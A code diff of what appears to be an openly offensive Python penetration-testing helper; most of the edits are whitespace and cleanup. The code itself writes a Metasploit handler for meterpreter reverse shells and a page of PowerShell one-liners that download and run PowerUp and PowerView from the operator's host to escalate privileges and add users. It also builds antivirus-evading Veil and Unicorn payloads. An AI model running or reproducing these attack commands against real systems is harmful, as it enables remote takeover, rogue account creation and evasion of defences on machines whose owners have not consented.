@@ -1,8 +1,8 @@
 #!/usr/bin/python
 # Andrew Luke @sw4mp_f0x
 # ToDo:
-#	Standalone scan option for at least ping sweep.
-#	Check for live-hosts before ping-sweep and ask if you still want to run.
+#   Standalone scan option for at least ping sweep.
+#   Check for live-hosts before ping-sweep and ask if you still want to run.
 #
 #
 # Todo:
@@ -207,17 +207,17 @@ def pentest_setup():
     ip = raw_input("Enter LHOST> ")
     bounce = open('/bounce', "w")
     bounce.write('''use exploit/multi/handler
-					jobs -K
-					set payload windows/meterpreter/reverse_tcp
-					set exitonsession false
-					set lport 53
-					set enablestageencoding true
-					set autorunscript migrate -f
-					set LHOST %s
-					exploit -j -z
-					set payload windows/meterpreter/reverse_https
-					set lport 443
-					exploit -j -z''' % (ip))
+                    jobs -K
+                    set payload windows/meterpreter/reverse_tcp
+                    set exitonsession false
+                    set lport 53
+                    set enablestageencoding true
+                    set autorunscript migrate -f
+                    set LHOST %s
+                    exploit -j -z
+                    set payload windows/meterpreter/reverse_https
+                    set lport 443
+                    exploit -j -z''' % (ip))
 
     bool = False
     while not bool:
@@ -231,27 +231,46 @@ def pentest_setup():
             bool = True
 
     cmd_html = ('''<b>Invoke-AllChecks</b><p><p>
-				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/PowerUp.ps1'); Invoke-Allchecks"
-				<p><p>
-				<b>Write-UserAddServiceBinary</b><p><p>
-				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/PowerUp.ps1'); Write-UserAddServiceBinary -ServiceName SQLRODBC"
-				<p><p>
-				<b>Invoke-ServiceUserAdd</b><p><p>
-				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/PowerUp.ps1'); Invoke-ServiceUserAdd -ServiceName spooler"
-				<p><p>
-				<b>Invoke-FindLocalAdminAccess</b><p><p>
-				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/powerview.ps1'); Invoke-FindLocalAdminAccess"
-				<p><p>
-				<b>Invoke-userhunter</b><p><p>
-				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/powerview.ps1'); Invoke-userhunter"
-				<p><p>
-				<b>Invoke-ShareFinder</b><p><p>
-				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/powerview.ps1'); Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii found_shares.txt"''' % (
+                powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/PowerUp.ps1'); Invoke-Allchecks"
+                <p><p>
+                <b>Write-UserAddServiceBinary</b><p><p>
+                powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/PowerUp.ps1'); Write-UserAddServiceBinary -ServiceName SQLRODBC"
+                <p><p>
+                <b>Invoke-ServiceUserAdd</b><p><p>
+                powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/PowerUp.ps1'); Invoke-ServiceUserAdd -ServiceName spooler"
+                <p><p>
+                <b>Invoke-FindLocalAdminAccess</b><p><p>
+                powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/powerview.ps1'); Invoke-FindLocalAdminAccess"
+                <p><p>
+                <b>Invoke-userhunter</b><p><p>
+                powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/powerview.ps1'); Invoke-userhunter"
+                <p><p>
+                <b>Invoke-ShareFinder</b><p><p>
+                powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/powerview.ps1'); Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii found_shares.txt"''' % (
         ip, ip, ip, ip, ip, ip))
 
     cmd_file = open(cmd_path, "w")
     cmd_file.write(cmd_html)
     cmd_file.close()
+
+    # Deleting old files
+    if os.path.exists("/root/HTTPS_443r.exe"):
+        os.remove("/root/HTTPS_443r.exe")
+    if os.path.exists("/root/TCP_53r.exe"):
+        os.remove("/root/TCP_53r.exe")
+    if os.path.exists("/root/power443.txt"):
+        os.remove("/root/power443.txt")
+    if os.path.exists("/root/power53.txt"):
+        os.remove("/root/power53.txt")
+    if os.path.exists("/var/www/html/HTTPS_443.exe"):
+        os.remove("/var/www/html/HTTPS_443.exe")
+    if os.path.exists("/var/www/html/TCP_53.exe"):
+        os.remove("/var/www/html/TCP_53.exe")
+    if os.path.exists("/var/www/html/power443.txt"):
+        os.remove("/var/www/html/power443.txt")
+    if os.path.exists("/var/www/html/power53.txt"):
+        os.remove("/var/www/html/power53.txt")
+
 
     # Build Veil Payloads
     TCPport = raw_input("Define TCP listening port:[53] ")
@@ -262,7 +281,7 @@ def pentest_setup():
         HTTPSport = '443'
     payload_type = raw_input("Define payload type (python, ruby, both): ")
     payload_paths = []
-
+    devnull = open('/dev/null', 'w')
     if payload_type == "both":
         payload_paths.append(boost.BuildVeilTCP(ip, TCPport, 'Veil_TCP_' + TCPport, lang='ruby', pwnstaller=True, overwrite=True))
         payload_paths.append(boost.BuildVeilTCP(ip, TCPport, 'Veil_TCP_' + TCPport, lang='python', pwnstaller=True, overwrite=True))
@@ -272,8 +291,8 @@ def pentest_setup():
         payload_paths.append(boost.BuildVeilTCP(ip, TCPport, 'Veil_TCP_' + TCPport, lang='python', pwnstaller=True, overwrite=True))
         payload_paths.append(boost.BuildVeilHTTPS(ip, HTTPSport, 'Veil_HTTPS_' + HTTPSport, lang='python', pwnstaller=True, overwrite=True))
     elif payload_type == "ruby":
-        payload_paths.append(boost.BuildVeilTCP(ip, TCPport, 'Veil_TCP_' + TCPport, lang='ruby', pwnstaller=True, overwrite=True))
-        payload_paths.append(boost.BuildVeilHTTPS(ip, HTTPSport, 'Veil_HTTPS_' + HTTPSport, lang='ruby', pwnstaller=True, overwrite=True))
+        payload_paths.append(boost.BuildVeilTCP(ip, TCPport, 'Veil_TCP_' + TCPport, lang='ruby', pwnstaller=True, overwrite=False, stdout=devnull, stderr=devnull))
+        payload_paths.append(boost.BuildVeilHTTPS(ip, HTTPSport, 'Veil_HTTPS_' + HTTPSport, lang='ruby', pwnstaller=True, overwrite=False, stdout=devnull, stderr=devnull))
 
     for path in payload_paths:
         shutil.copyfile(path, "/root/%s" % (path.split('/')[-1]))
@@ -289,8 +308,8 @@ def pentest_setup():
     open_payload = open("./powershell_attack.txt", "r")
     unicorn_https_payload = open_payload.readlines()
     update_cmd.write('''<p><p>
-						<b>Powershell HTTPS Payload</b><p><p>
-						%s''' % (unicorn_https_payload[0]))
+                        <b>Powershell HTTPS Payload</b><p><p>
+                        %s''' % (unicorn_https_payload[0]))
     open_payload.close()
 
     # Build Unicorn Powershell HTTPS payload
@@ -302,8 +321,8 @@ def pentest_setup():
     open_payload = open("./powershell_attack.txt", "r")
     unicorn_tcp_payload = open_payload.readlines()
     update_cmd.write('''<p><p>
-						<b>Powershell TCP Payload</b><p><p>
-						%s''' % (unicorn_tcp_payload[0]))
+                        <b>Powershell TCP Payload</b><p><p>
+                        %s''' % (unicorn_tcp_payload[0]))
     update_cmd.close()
     open_payload.close()
     os.remove("./powershell_attack.txt")
@@ -566,11 +585,11 @@ def main_menu(check=""):
         message = ""
 
         print("Roll For Initiative Options:")
-        print("	[1] Kickoff Scans")
-        print("	[2] Web Interface Scan + Rawr")
-        print("	[3] Nmap Service Scan")
-        print("	[4] Pentest Setup")
-        print("	[5] NFSulator (by @MrMindscrew)")
+        print(" [1] Kickoff Scans")
+        print(" [2] Web Interface Scan + Rawr")
+        print(" [3] Nmap Service Scan")
+        print(" [4] Pentest Setup")
+        print(" [5] NFSulator (by @MrMindscrew)")
         print("")
         selection = raw_input("Please select an option: ")
         if 1 <= int(selection) <= 5:
@@ -582,17 +601,20 @@ def main_menu(check=""):
         main_menu("Invalid entry. Pick again.")
 
 
-LiveHostCount = 0
-rawr_folder = "/root/tools/rawr/rawr.py"
-global cmd_path
-cmd_path = ""
-global message
-message = ""
-setup()
 
-try:
-    while True:
-        main_menu(message)
-        unused_var = os.system("clear")
-except KeyboardInterrupt:
-    print("Later!")
+if __name__ == "__main__":
+    LiveHostCount = 0
+    rawr_folder = "/root/tools/rawr/rawr.py"
+    global cmd_path
+    cmd_path = ""
+    global message
+    message = ""
+    setup()
+    
+    try:
+        while True:
+            main_menu(message)
+            unused_var = os.system("clear")
+    except KeyboardInterrupt:
+        print("Later!")
+
